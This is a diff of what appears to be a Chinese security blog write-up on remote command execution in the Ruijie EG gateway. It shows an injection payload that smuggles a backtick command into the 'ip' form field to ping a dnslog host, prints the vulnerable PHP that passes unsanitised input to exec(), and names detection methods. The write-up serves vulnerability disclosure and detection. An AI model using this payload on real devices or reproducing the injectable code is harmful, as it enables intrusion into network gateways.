@@ -304,6 +304,56 @@ mac=1&amp;ip=%60busybox ping -c 2 pingtest.xxx.ceye.io%60
 
 <p><img src="/img/2020-12-29-锐捷易网关远程命令执行/image-20201229103053455.png" alt="image-20201229103053455" /></p>
 
+<h3 id="漏洞代码">漏洞代码</h3>
+
+<p>利用漏洞下载php文件，查看源码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>&lt;?php
+    //查询用户是否上线了
+    $userip = @$_POST['ip'];
+    $usermac = @$_POST['mac'];
+    if (!$userip || !$usermac) {
+        exit;
+    }
+    /* 判断该用户是否已经放行 */
+    $cmd = '/sbin/app_auth_hook.elf -f ' . $userip;
+    $res = exec($cmd, $out, $status);
+    /* 如果已经上线成功 */
+    if (strstr($out[0], "status:1")) {
+        echo 'true';
+    }
+?&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="漏洞检测">漏洞检测</h3>
+
+<p>无法直接回显，漏洞检测可以通过以下两种方式：</p>
+
+<ol>
+  <li>
+    <p>dnslog</p>
+  </li>
+  <li>
+    <p>写文件探测</p>
+  </li>
+</ol>
+
+
 
                 <hr style="visibility: hidden;">
                 <ul class="pager">
